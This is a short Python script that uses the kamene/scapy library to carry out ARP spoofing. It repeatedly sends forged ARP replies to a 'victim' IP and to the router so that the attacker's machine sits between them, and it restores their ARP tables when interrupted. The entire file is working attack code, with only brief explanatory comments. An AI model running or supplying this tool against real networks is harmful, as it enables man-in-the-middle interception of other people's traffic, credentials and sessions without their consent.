#!/usr/bin/env python

import kamene.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target / victim IP address")
    parser.add_argument("-r", "--router", dest="router", help="Router IP address")
    parser.add_argument("-d", "--debug", dest="debug", help="Debug", default=False)
    options = parser.parse_args()
    if not options.target:
        parser.error("\n[-] Please specify a network, use --help for details")
    return options


def spoof(target_ip, spoof_ip, debug=False):
    # hwsrc is set to this machine MAC address by default
    packet = scapy.ARP(op=2,  # set ARP type to response (by default it's REQUEST type)
                       pdst=target_ip,  # IP address of victim
                       hwdst=get_mac(target_ip),  # MAC address of victim
                       psrc=spoof_ip)  # IP of a router
    print(packet.summary()) if debug else None
    print(packet.show()) if debug else None
    scapy.send(packet, verbose=debug)


def get_mac(ip, debug=False):
    # scapy.ls(scapy.ARP())  # list input parameters
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # ff:ff:ff:ff:ff:ff is a broadcast MAC
    arp_request_broadcast = broadcast/arp_request  # combine Ethernet packet and ARP request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=debug)[0]
    return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip, debug=False):
    packet = scapy.ARP(op=2,
                       pdst=destination_ip,
                       hwdst=get_mac(destination_ip),
                       psrc=source_ip,
                       hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=debug)


options = get_arguments()
packets_sent = 0
try:
    while True:
        spoof(target_ip=options.target, spoof_ip=options.router, debug=options.debug)
        spoof(target_ip=options.router, spoof_ip=options.target, debug=options.debug)
        packets_sent += 2
        print("\r[+] Packets sent: " + str(packets_sent), end="")  # this allows to overwrite the output
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL + C, quitting...")
    restore(destination_ip=options.target, source_ip=options.router, debug=options.debug)
    restore(destination_ip=options.router, source_ip=options.target, debug=options.debug)
